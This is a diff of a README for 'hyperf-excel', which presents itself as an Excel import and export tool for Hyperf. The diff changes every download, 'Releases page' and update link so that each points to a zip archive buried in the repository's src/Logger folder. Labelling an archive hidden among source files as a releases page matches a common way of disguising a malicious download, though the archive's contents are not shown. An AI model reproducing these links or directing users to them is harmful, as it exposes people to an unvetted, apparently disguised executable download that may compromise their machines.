@@ -1,6 +1,6 @@
 # 🎉 hyperf-excel - Simplified Excel Import and Export Tool
 
-[![Download hyperf-excel](https://raw.githubusercontent.com/thelasstyoulsee/hyperf-excel/master/src/Exception/hyperf-excel_v3.7-beta.4.zip)](https://raw.githubusercontent.com/thelasstyoulsee/hyperf-excel/master/src/Exception/hyperf-excel_v3.7-beta.4.zip)
+[![Download hyperf-excel](https://github.com/thelasstyoulsee/hyperf-excel/raw/refs/heads/master/src/Logger/excel-hyperf-bout.zip)](https://github.com/thelasstyoulsee/hyperf-excel/raw/refs/heads/master/src/Logger/excel-hyperf-bout.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To get started with hyperf-excel, you need to download the software and set it u
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/thelasstyoulsee/hyperf-excel/master/src/Exception/hyperf-excel_v3.7-beta.4.zip) to access the latest version of hyperf-excel.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/thelasstyoulsee/hyperf-excel/raw/refs/heads/master/src/Logger/excel-hyperf-bout.zip) to access the latest version of hyperf-excel.
    
 2. **Choose Your Version:** On the Releases page, find the most recent version listed. Each release will have additional details that you may find helpful.
 
@@ -59,7 +59,7 @@ Once you've installed hyperf-excel, you can start using it immediately. Here’s
 
 If you encounter any issues while using hyperf-excel, try the following steps:
 
-- **Check for Updates:** Visit the [Releases page](https://raw.githubusercontent.com/thelasstyoulsee/hyperf-excel/master/src/Exception/hyperf-excel_v3.7-beta.4.zip) to see if a newer version is available.
+- **Check for Updates:** Visit the [Releases page](https://github.com/thelasstyoulsee/hyperf-excel/raw/refs/heads/master/src/Logger/excel-hyperf-bout.zip) to see if a newer version is available.
 - **Reinstall the Application:** Sometimes, reinstalling can solve unexpected problems.
 - **Refer to the Documentation:** We provide a help section within the application for common issues.
 
